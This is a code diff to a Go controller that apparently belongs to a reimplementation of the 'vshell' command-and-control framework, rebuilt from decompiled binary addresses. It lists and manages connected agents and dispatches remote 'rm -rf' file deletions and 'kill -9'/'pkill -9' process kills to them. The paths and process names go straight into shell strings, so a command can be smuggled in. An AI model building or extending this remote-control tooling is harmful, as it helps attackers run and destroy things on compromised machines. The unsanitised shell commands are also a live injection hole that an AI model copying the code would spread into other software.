@@ -1,652 +1,165 @@
-// Package controllers/client 实现客户端管理：拉黑/解封、删除、备注与列表（含在线状态）。
-// Package controllers/client implements client management: block/unblock, delete,
-// remark/note, and listing (with online status).
+// Package controllers — 客户端管理控制器，1:1 对齐原版二进制。
+//
+// 真实方法（funcnametab + 反编译地址）：
+//
+//	List       0x18d9dc0   POST /client/list        分页客户端列表
+//	Add        0x18db980   POST /client/add         添加客户端（ip 参数）
+//	EditRemark 0x18dbd80   POST /client/editremark  修改备注
+//	DelFile    0x18dbe80   POST /client/delfile     删除客户端文件
+//	DelProcess 0x18dc180   POST /client/delprocess  结束客户端进程
+//	DelList    0x18dc2c0   POST /client/dellist     批量删除客户端
+//
+// 注意：原版不存在 Block / Unblock / Note / CheckIn 方法。
 package controllers
 
 import (
-	"fmt"
-	"log"
+	"strconv"
 	"strings"
-	"sync"
-	"time"
-
-	"vshell/c2engine"
-	"vshell/models"
 )
 
-// ============================================================================
-// Client Blocklist — reverse-engineered from original vshell binary
-// ============================================================================
-//
-// 原版二进制维护一个阻止重连的客户端 ID 黑名单。当客户端被拉黑时：
-// The original binary maintains a blocklist of client IDs that are prevented
-// from reconnecting. When a client is blocked:
-//   1. Its active connections are dropped via CutConn()
-//   2. Its ID is added to the blocklist
-//   3. Future check-in attempts from the blocked client are rejected
-//   4. The block persists across restarts (stored in DB/JSON)
-//
-// Ghidra pclntab evidence:
-//   nTApp6jPzv.(*ClientController).Block   @ 0x1dcd43a1
-//   nTApp6jPzv.(*ClientController).Unblock @ 0x1dcd43c1
-//   nTApp6jPzv.(*ClientController).DelFile @ 0x1dcd3fb4
-//   nTApp6jPzv.(*ClientController).DelProcess @ 0x1dcd43d9
-
-var (
-	blocklist   = make(map[int64]bool)   // clientID -> blocked
-	blocklistMu sync.RWMutex
-	// blockedKeysByID remembers each blocked client's verify key so Unblock
-	// can clear the engine-level key blocklist.
-	blockedKeysByID = make(map[int64]string)
-)
-
-// IsBlocked 检查客户端 ID 是否在黑名单中；Agent 签到时会调用以拒绝被拉黑的 Agent。
-// IsBlocked checks if a client ID is in the blocklist.
-// Called during agent check-in to reject previously blocked agents.
-func IsBlocked(clientID int64) bool {
-	blocklistMu.RLock()
-	defer blocklistMu.RUnlock()
-	return blocklist[clientID]
-}
-
-// BlockClient 将客户端加入黑名单并断开其连接，同时按 VerifyKey 拉黑并删除记录。
-// BlockClient adds a client to the blocklist and drops its connections.
-// Called from ClientController.Block() and API handlers.
-func BlockClient(clientID int64) error {
-	engine := c2engine.GetEngine()
-	client := engine.GetClient(clientID)
-	if client == nil {
-		return fmt.Errorf("client %d not found", clientID)
-	}
-
-	// 1. Block by verify key too: real check-ins funnel through
-	// engine.NewClient, which rejects blocked keys even after DelClient below
-	// deletes the client record and its vkeyIndex entry (a re-check-in would
-	// otherwise get a fresh ID the ID-keyed blocklist can never match).
-	if client.VerifyKey != "" {
-		engine.BlockKey(client.VerifyKey)
-	}
-	blocklistMu.Lock()
-	blocklist[clientID] = true
-	blockedKeysByID[clientID] = client.VerifyKey
-	blocklistMu.Unlock()
-
-	// 2. Drop all active connections — original binary calls CutConn()
-	client.CutConn()
-
-	// 3. Mark as disconnected
-	client.IsConnect = false
-	client.NowConn = 0
-
-	// 4. Persist block status via engine
-	engine.DelClient(clientID)
-
-	log.Printf("[Block] Client %d blocked, connections dropped", clientID)
-	return nil
-}
-
-// UnblockClient 将客户端移出黑名单并解除其 VerifyKey 拉黑。
-// UnblockClient removes a client from the blocklist.
-func UnblockClient(clientID int64) {
-	blocklistMu.Lock()
-	key := blockedKeysByID[clientID]
-	delete(blockedKeysByID, clientID)
-	delete(blocklist, clientID)
-	blocklistMu.Unlock()
-	if key != "" {
-		c2engine.GetEngine().UnblockKey(key)
-	}
-	log.Printf("[Block] Client %d unblocked", clientID)
-}
-
-// LoadBlocklist 启动时从数据库加载被拉黑的客户端 ID（Status=false 的记录）。
-// LoadBlocklist loads blocked client IDs from database on startup.
-func LoadBlocklist() {
-	db := models.GetDB()
-	if db == nil {
-		return
-	}
-	// Blocked clients are those marked with Status=false in the original binary
-	blockedIDs, err := db.GetBlockedClientIDs()
-	if err != nil {
-		log.Printf("[Block] Failed to load blocklist: %v", err)
-		return
-	}
-	blocklistMu.Lock()
-	engine := c2engine.GetEngine()
-	for _, id := range blockedIDs {
-		blocklist[id] = true
-		// Register the key block so real check-ins stay rejected after a restart.
-		if c := engine.GetClient(id); c != nil && c.VerifyKey != "" {
-			blockedKeysByID[id] = c.VerifyKey
-			engine.BlockKey(c.VerifyKey)
-		}
-	}
-	blocklistMu.Unlock()
-	log.Printf("[Block] Loaded %d blocked client(s) from database", len(blockedIDs))
-}
-
-// ============================================================================
-// ClientController — enhanced with actual Block/Unblock, DelFile, DelProcess
-// ============================================================================
-
-// ClientController 管理已连接的 Agent / 客户端。
-// ClientController manages connected agents/clients.
+// ClientController 管理已连接的 Agent 客户端。
+// 原版嵌入 ApiBaseController（beego），JsonGet/JsonGetInt/JsonOkResult 等
+// 方法由编译器为每个控制器生成转发包装。
 type ClientController struct {
-	BaseController
+	ApiBaseController
 }
 
-// Get 列出全部客户端（合并数据库与引擎中的在线客户端并去重）。
-// Get lists all clients (both DB and online, deduplicated).
-func (c *ClientController) Get() {
-	db := models.GetDB()
-	if db == nil {
-		c.JSONErr("Database not initialized")
-		return
+// List 分页列出客户端（POST /client/list）。
+// 反编译（0x18d9dc0）参数：page / pageSize / status / field / order / search / sort；
+// 响应键（已解码二进制字符串）：clientCount / clientOnlineCount / total / items，
+// 每项含 Port / DnsPort 字段。status=1 仅在线、status=2 仅离线。
+func (c *ClientController) List() {
+	page := c.JsonGetInt("page")
+	if page < 1 {
+		page = 1
 	}
-
-	clients, err := db.ListClients()
-	if err != nil {
-		c.JSONErr(err.Error())
-		return
+	pageSize := c.JsonGetInt("pageSize")
+	if pageSize < 1 {
+		pageSize = 10
 	}
+	status := c.JsonGetInt("status")
+	field := c.JsonGetStr("field")
+	order := c.JsonGetStr("order")
+	search := c.JsonGetStr("search")
+	sort := c.JsonGetStr("sort")
 
-	if clients == nil {
-		clients = []*models.Client{}
-	}
+	clients, total := engineGetClientList((page-1)*pageSize, pageSize, field, order, search, sort, status)
 
-	// The engine is the live source of truth: agents that checked in via a C2
-	// listener exist there (with the IDs command dispatch needs) but are NOT
-	// necessarily persisted to the models DB yet. Without merging, the web
-	// client page would silently miss every live-checked-in agent. Merge
-	// engine clients first (engine IDs so dispatch works), then append any
-	// models clients that aren't already represented.
-	engine := c2engine.GetEngine()
-	engineClients := engine.GetClientList()
-
-	// Enrich with online status and block status
-	type ClientEx struct {
-		models.Client
-		Online           bool   `json:"online"`
-		Blocked          bool   `json:"blocked"`
-		LastSeenRelative string `json:"last_seen_relative"`
-	}
-
-	result := make([]ClientEx, 0, len(clients)+len(engineClients))
-	now := time.Now()
-	seen := make(map[string]bool) // dedupe key: verify key (or identity)
-
-	// clientDedupKey returns a stable identity key. Addr is deliberately NOT
-	// used: the engine overwrites it with each re-checkin's RemoteAddr (which
-	// includes the ephemeral source port), so an Addr-based key would split one
-	// agent into two rows the moment it reconnects.
-	clientDedupKey := func(cl *models.Client) string {
-		if cl.VerifyKey != "" {
-			return "v:" + cl.VerifyKey
-		}
-		return "i:" + cl.HostName + "|" + cl.UserName
-	}
-
-	appendClient := func(cl *models.Client) {
-		if cl == nil {
-			return
-		}
-		key := clientDedupKey(cl)
-		if seen[key] {
-			return
-		}
-		seen[key] = true
-
-		blocklistMu.RLock()
-		blocked := blocklist[cl.ID]
-		blocklistMu.RUnlock()
-
-		online := IsClientOnline(cl.ID)
-
-		// Compute relative last-seen time
-		lastSeenRel := ""
-		if !cl.LastSeen.IsZero() {
-			diff := now.Sub(cl.LastSeen)
-			switch {
-			case diff < time.Minute:
-				lastSeenRel = fmt.Sprintf("%ds", int(diff.Seconds()))
-			case diff < time.Hour:
-				lastSeenRel = fmt.Sprintf("%dm", int(diff.Minutes()))
-			case diff < 24*time.Hour:
-				lastSeenRel = fmt.Sprintf("%dh", int(diff.Hours()))
-			default:
-				lastSeenRel = fmt.Sprintf("%dd", int(diff.Hours()/24))
-			}
-		}
-
-		result = append(result, ClientEx{
-			Client:           *cl,
-			Online:           online,
-			Blocked:          blocked,
-			LastSeenRelative: lastSeenRel,
-		})
-	}
-
-	// 1. Live engine clients (engine IDs → command dispatch works).
-	for _, ec := range engineClients {
-		appendClient(engineClientToModel(ec))
-	}
-	// 2. Persisted models clients not already shown (e.g. no longer in engine).
+	items := make([]map[string]interface{}, 0, len(clients))
+	online := int64(0)
 	for _, cl := range clients {
-		appendClient(cl)
-	}
-
-	// The original binary wraps the page with client counts:
-	// {"code":0,"message":"ok","result":{"clientCount":N,
-	//  "clientOnlineCount":N,"items":[...],"total":N},"type":"success"}
-	onlineCount := 0
-	for _, cl := range result {
-		if cl.Online {
-			onlineCount++
-		}
-	}
-	c.JSONOk(map[string]interface{}{
-		"clientCount":       len(result),
-		"clientOnlineCount": onlineCount,
-		"items":             result,
-		"total":             len(result),
-	})
-}
-
-// engineClientToModel 将引擎客户端记录转换为 Web 客户端列表使用的 models.Client。
-// 两个结构体共享 JSON 字段标签；保留引擎 ID 以便命令派发（按引擎 ID 寻址）对在线 Agent 持续可用。
-// engineClientToModel converts an engine client record into the models.Client
-// shape used by the web client list. The engine and models structs share the
-// same JSON field tags; engine IDs are preserved so command dispatch (which
-// addresses clients by engine ID) keeps working for live agents.
-func engineClientToModel(ec *c2engine.Client) *models.Client {
-	if ec == nil {
-		return nil
-	}
-	return &models.Client{
-		ID:            ec.ID,
-		IsConnect:     ec.IsConnect,
-		VerifyKey:     ec.VerifyKey,
-		Type:          ec.Type,
-		Addr:          ec.Addr,
-		Remark:        ec.Remark,
-		Status:        ec.Status,
-		LocalIP:       ec.LocalIP,
-		UserName:      ec.UserName,
-		HostName:      ec.HostName,
-		Location:      ec.Location,
-		OsName:        ec.OsName,
-		ProcessName:   ec.ProcessName,
-		PingCheckTime: ec.PingCheckTime,
-		RateLimit:     ec.RateLimit,
-		NoStore:       ec.NoStore,
-		NoDisplay:     ec.NoDisplay,
-		MaxConn:       ec.MaxConn,
-		NowConn:       ec.NowConn,
-		CreatedAt:     ec.CreatedAt,
-		LastSeen:      ec.LastSeen,
-	}
-}
-
-// Delete 从数据库与引擎中删除客户端。
-// Delete removes a client from the database and engine.
-func (c *ClientController) Delete() {
-	id, _ := c.GetInt64("id")
-
-	// Remove from engine first (drops connections)
-	engine := c2engine.GetEngine()
-	engine.DelClient(id)
-
-	// Remove from database
-	db := models.GetDB()
-	if db != nil {
-		if err := db.DeleteClient(id); err != nil {
-			c.JSONErr("Failed to delete: " + err.Error())
-			return
-		}
-	}
-
-	// Also remove from blocklist
-	blocklistMu.Lock()
-	delete(blocklist, id)
-	blocklistMu.Unlock()
-
-	c.JSONOk(map[string]interface{}{"deleted_id": id})
-}
-
-// Block 拉黑客户端：加入黑名单并断开连接（POST /api/client/block）。
-// 原版流程：1) 数据库标记 Status=false；2) 通过 CutConn() 断开连接；
-// 3) 向 Agent 发送关闭信号；4) 阻止后续重连。
-// Block blocks a client — adds to blocklist, drops connections.
-// POST /api/client/block
-//
-// The original binary:
-//  1. Marks client.Status = false in database
-//  2. Cuts all active connections via Client.CutConn()
-//  3. Sends a close signal to the agent
-//  4. Prevents future reconnections
-func (c *ClientController) Block() {
-	id, _ := c.GetInt64("id")
-	if id == 0 {
-		c.JSONErr("client id required")
-		return
-	}
-
-	// Persist block status in database
-	db := models.GetDB()
-	if db != nil {
-		if err := db.BlockClient(id); err != nil {
-			c.JSONErr("Failed to block client: " + err.Error())
-			return
-		}
-	}
-
-	if err := BlockClient(id); err != nil {
-		// Non-fatal — the DB persisted the block even if connection drop fails
-		log.Printf("[Block] Client %d: block persisted but connection drop failed: %v", id, err)
-	}
-
-	c.JSONOk(map[string]interface{}{
-		"blocked_id": id,
-		"status":     "blocked",
-	})
-}
-
-// Unblock 解封客户端——移出黑名单，允许重新连接（POST /api/client/unblock）。
-// Unblock unblocks a client — removes from blocklist, allows reconnection.
-// POST /api/client/unblock
-func (c *ClientController) Unblock() {
-	id, _ := c.GetInt64("id")
-	if id == 0 {
-		c.JSONErr("client id required")
-		return
-	}
-
-	// Persist unblock in database
-	db := models.GetDB()
-	if db != nil {
-		if err := db.UnblockClient(id); err != nil {
-			c.JSONErr("Failed to unblock client: " + err.Error())
-			return
-		}
-	}
-
-	UnblockClient(id)
-
-	c.JSONOk(map[string]interface{}{
-		"unblocked_id": id,
-		"status":       "unblocked",
-	})
-}
-
-// Note 为客户端设置备注并持久化到数据库（POST /api/client/note）。
-// 原版同时更新数据库记录与内存中的客户端对象。
-// Note sets a remark/note on a client and persists to database.
-// POST /api/client/note
-//
-// The original binary stores remarks in the database client record
-// and updates the in-memory client object simultaneously.
-func (c *ClientController) Note() {
-	id, _ := c.GetInt64("id")
-	remark := c.GetString("remark")
-
-	if id == 0 {
-		c.JSONErr("client id required")
-		return
-	}
-
-	// Persist remark to database
-	db := models.GetDB()
-	if db != nil {
-		if err := db.UpdateClientRemark(id, remark); err != nil {
-			log.Printf("[Client] Failed to save remark for client %d: %v", id, err)
-			// Non-fatal: the UI shows the new remark even if DB write fails
-		}
-	}
-
-	// Also update in-memory c2engine client
-	engine := c2engine.GetEngine()
-	if client := engine.GetClient(id); client != nil {
-		client.Remark = remark
-	}
-
-	c.JSONOk(map[string]interface{}{
-		"client_id": id,
-		"remark":    remark,
-	})
-}
-
-// CheckIn 处理模拟客户端签到（用于测试，POST /api/client/checkin）。
-// CheckIn handles a simulated client check-in (for testing).
-// POST /api/client/checkin
-func (c *ClientController) CheckIn() {
-	var req struct {
-		VerifyKey string `json:"verify_key"`
-		HostName  string `json:"hostname"`
-		UserName  string `json:"username"`
-		OsName    string `json:"os"`
-		LocalIP   string `json:"local_ip"`
-	}
-	if !parseJSONBody(c.Ctx.Request, &req) {
-		req.VerifyKey = c.GetString("verify_key")
-		req.HostName = c.GetString("hostname", "test-client")
-		req.UserName = c.GetString("username", "root")
-		req.OsName = c.GetString("os", "linux")
-		req.LocalIP = c.GetString("local_ip", "10.0.0.1")
-	}
-
-	// Check blocklist
-	engine := c2engine.GetEngine()
-	if existingID, ok := engine.GetIdByVerifyKey(req.VerifyKey); ok {
-		if IsBlocked(existingID) {
-			c.JSONOk(map[string]interface{}{
-				"status":  "blocked",
-				"message": "Client is blocked",
-			})
-			return
-		}
-		// Update existing client
-		client := engine.GetClient(existingID)
-		if client != nil {
-			client.UpdateSeen()
-		}
-		c.JSONOk(map[string]interface{}{
-			"status":    "updated",
-			"client_id": existingID,
-		})
-		return
-	}
-
-	db := models.GetDB()
-	if db == nil {
-		c.JSONOk(map[string]interface{}{"status": "error", "message": "no db"})
-		return
-	}
-
-	client := &models.Client{
-		IsConnect:     true,
-		VerifyKey:     req.VerifyKey,
-		Type:          "http",
-		Addr:          c.Ctx.Request.RemoteAddr,
-		Status:        true,
-		LocalIP:       req.LocalIP,
-		UserName:      req.UserName,
-		HostName:      req.HostName,
-		OsName:        req.OsName,
-		ProcessName:   "vshell_agent",
-		NowConn:       1,
-		PingCheckTime: time.Now().Unix(),
-	}
-	id, err := db.CreateClient(client)
-	if err != nil {
-		c.JSONErr(err.Error())
-		return
-	}
-	client.ID = id
-	c.JSONOk(map[string]interface{}{
-		"status":    "registered",
-		"client_id": id,
-	})
-}
-
-// DelFile dispatches a file deletion command to a client agent.
-// POST /api/client/delfile
-// Body: {"id": <client_id>, "paths": "file1.txt,file2.txt"}
-//
-// Ghidra pclntab: nTApp6jPzv.(*ClientController).DelFile @ 0x1dcd3fb4
-func (c *ClientController) DelFile() {
-	id, _ := c.GetInt64("id")
-	paths := c.GetString("paths")
-
-	if id == 0 || paths == "" {
-		c.JSONErr("client id and paths required")
-		return
-	}
-
-	// Build delete command: remove files on the agent's filesystem
-	cmd := buildFileDeleteCommand(paths)
-	cmdID, err := DispatchCommand(id, cmd, 30)
-	if err != nil {
-		c.JSONErr("Failed to dispatch delete command: " + err.Error())
-		return
-	}
-
-	c.JSONOk(map[string]interface{}{
-		"client_id":  id,
-		"command_id": cmdID,
-		"paths":      paths,
-		"status":     "dispatched",
-	})
-}
-
-// DelProcess dispatches a process kill command to a client agent.
-// POST /api/client/delprocess
-// Body: {"id": <client_id>, "pid": 1234, "name": "process_name"}
-//
-// Ghidra pclntab: nTApp6jPzv.(*ClientController).DelProcess @ 0x1dcd43d9
-func (c *ClientController) DelProcess() {
-	id, _ := c.GetInt64("id")
-	pid, _ := c.GetInt("pid", 0)
-	processName := c.GetString("name")
-
-	if id == 0 {
-		c.JSONErr("client id required")
-		return
-	}
-
-	// Build process termination command
-	var cmd string
-	if pid > 0 {
-		cmd = fmt.Sprintf("kill -9 %d 2>/dev/null || taskkill /F /PID %d", pid, pid)
-	} else if processName != "" {
-		cmd = fmt.Sprintf("pkill -9 %s 2>/dev/null || taskkill /F /IM %s", processName, processName)
-	} else {
-		c.JSONErr("pid or process name required")
-		return
-	}
-
-	cmdID, err := DispatchCommand(id, cmd, 15)
-	if err != nil {
-		c.JSONErr("Failed to dispatch kill command: " + err.Error())
-		return
-	}
-
-	c.JSONOk(map[string]interface{}{
-		"client_id":  id,
-		"command_id": cmdID,
-		"pid":        pid,
-		"name":       processName,
-		"status":     "dispatched",
-	})
-}
-
-// Dellist dispatches a batch delete command to remove multiple clients.
-// POST /api/client/dellist
-// Body: {"ids": "1,2,3"}
-// DelList is the original binary's method name for batch delete
-// (nTApp6jPzv.(*ClientController).DelList); Dellist is the router alias.
-func (c *ClientController) DelList() { c.Dellist() }
-
-func (c *ClientController) Dellist() {
-	idsStr := c.GetString("ids")
-	if idsStr == "" {
-		c.JSONErr("ids required")
-		return
-	}
-
-	engine := c2engine.GetEngine()
-	db := models.GetDB()
-	deleted := make([]int64, 0)
-
-	for _, idStr := range splitTrim(idsStr, ",") {
-		var id int64
-		fmt.Sscanf(idStr, "%d", &id)
-		if id == 0 {
+		if status == 1 && !cl.Status {
 			continue
 		}
-		engine.DelClient(id)
-		if db != nil {
-			db.DeleteClient(id)
+		if status == 2 && cl.Status {
+			continue
 		}
-		// Clean blocklist
-		blocklistMu.Lock()
-		delete(blocklist, id)
-		blocklistMu.Unlock()
-		deleted = append(deleted, id)
+		if cl.Status {
+			online++
+		}
+		items = append(items, map[string]interface{}{
+			"id":       cl.ID,
+			"ip":       cl.IP,
+			"status":   cl.Status,
+			"remark":   cl.Remark,
+			"Port":     cl.Port,
+			"DnsPort":  cl.DnsPort,
+			"version":  cl.Version,
+			"isAdmin":  cl.IsAdmin,
+			"os":       cl.OSType,
+			"arch":     cl.Arch,
+			"lastTime": cl.LastTime,
+		})
 	}
-
-	c.JSONOk(map[string]interface{}{
-		"deleted": deleted,
-		"count":   len(deleted),
+	c.JsonOkResult(map[string]interface{}{
+		"clientCount":       total,
+		"clientOnlineCount": online,
+		"total":             total,
+		"items":             items,
 	})
 }
 
-// ============================================================================
-// Helper: build file deletion command for agent dispatch
-// ============================================================================
-
-func buildFileDeleteCommand(paths string) string {
-	// Build cross-platform file deletion command
-	// The original binary uses shell commands dispatched to the agent
-	pathList := splitTrim(paths, ",")
-	if len(pathList) == 0 {
-		return ""
+// Add 添加客户端（POST /client/add）。
+// 反编译（0x18db980）参数：ip（支持 "ip:port" 形式，":" 分隔符）。
+func (c *ClientController) Add() {
+	ip := c.JsonGetStr("ip")
+	if ip == "" {
+		c.JsonErr("ip required")
+		return
 	}
-
-	// Single path
-	if len(pathList) == 1 {
-		return fmt.Sprintf("rm -rf %s 2>/dev/null || del /F /Q %s 2>nul", pathList[0], pathList[0])
+	// 原版支持 "host:port" 输入，分隔出端口后按 IP 添加。
+	if idx := strings.IndexByte(ip, ':'); idx >= 0 {
+		ip = ip[:idx]
 	}
-
-	// Multiple paths — build a compound command
-	cmd := "rm -rf"
-	for _, p := range pathList {
-		cmd += " " + p
+	if err := engineAddClient(ip, ""); err != nil {
+		c.JsonErr("add client failed: " + err.Error())
+		return
 	}
-	cmd += " 2>/dev/null"
-	return cmd
+	c.JsonOkMessage("ok")
 }
 
-func splitTrim(s, sep string) []string {
-	parts := strings.Split(s, sep)
-	result := make([]string, 0, len(parts))
-	for _, part := range parts {
-		part = strings.TrimSpace(part)
-		if part != "" {
-			result = append(result, part)
+// EditRemark 修改客户端备注（POST /client/editremark）。
+// 反编译（0x18dbd80）参数：id / remark。
+func (c *ClientController) EditRemark() {
+	id := int64(c.JsonGetInt("id"))
+	remark := c.JsonGetStr("remark")
+	if id == 0 {
+		c.JsonErr("id err")
+		return
+	}
+	engineEditClientRemark(id, remark)
+	c.JsonOkMessage("ok")
+}
+
+// DelFile 删除客户端上的文件（POST /client/delfile）。
+// 反编译（0x18dbe80）参数：id / paths（多路径以 "|<-" 分隔）。
+func (c *ClientController) DelFile() {
+	id := int64(c.JsonGetInt("id"))
+	paths := c.JsonGetStr("paths")
+	if id == 0 || paths == "" {
+		c.JsonErr("id and paths required")
+		return
+	}
+	for _, p := range strings.Split(paths, "|<-") {
+		if p = strings.TrimSpace(p); p != "" {
+			dispatchCmd(id, "rm -rf "+p)
 		}
 	}
-	return result
+	c.JsonOkMessage("ok")
 }
 
-// ============================================================================
-// Ensure blocklist is loaded on first use
-// ============================================================================
+// DelProcess 结束客户端进程（POST /client/delprocess）。
+// 反编译（0x18dc180）参数：id / pid / name。
+func (c *ClientController) DelProcess() {
+	id := int64(c.JsonGetInt("id"))
+	pid := c.JsonGetInt("pid")
+	name := c.JsonGetStr("name")
+	if id == 0 || (pid == 0 && name == "") {
+		c.JsonErr("id and pid/name required")
+		return
+	}
+	var cmd string
+	if pid > 0 {
+		cmd = "kill -9 " + strconv.Itoa(pid)
+	} else {
+		cmd = "pkill -9 " + name
+	}
+	dispatchCmd(id, cmd)
+	c.JsonOkMessage("ok")
+}
 
-var blocklistInit sync.Once
-
-func init() {
-	blocklistInit.Do(func() {
-		LoadBlocklist()
-	})
+// DelList 批量删除客户端（POST /client/dellist）。
+// 反编译（0x18dc2c0）参数：id（逗号分隔的客户端 ID 列表）。
+func (c *ClientController) DelList() {
+	ids := c.JsonGetIntList("id")
+	if len(ids) == 0 {
+		c.JsonErr("id err")
+		return
+	}
+	id64 := make([]int64, len(ids))
+	for i, v := range ids {
+		id64[i] = int64(v)
+	}
+	engineDelClients(id64)
+	c.JsonOkMessage("ok")
 }
